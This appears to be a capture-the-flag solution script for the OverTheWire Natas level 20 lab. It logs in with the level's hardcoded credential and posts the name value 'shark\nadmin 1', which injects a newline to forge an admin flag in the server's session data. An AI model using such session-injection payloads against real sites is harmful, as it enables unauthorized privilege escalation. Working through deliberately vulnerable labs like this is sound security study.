Debug

```
#!/usr/bin/env python
import requests
import re


username = 'natas20'
password = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()

response = session.get(url, auth = (username, password))
content = response.text
print(content) 
print ('='*80)

response = session.post(url, data = {"name" : "shark\nadmin 1"}, auth = (username, password))
content = response.text
print(content) 
print ('='*80)

response = session.get(url, auth = (username, password))
content = response.text

print(content) 
print ('='*80)

```
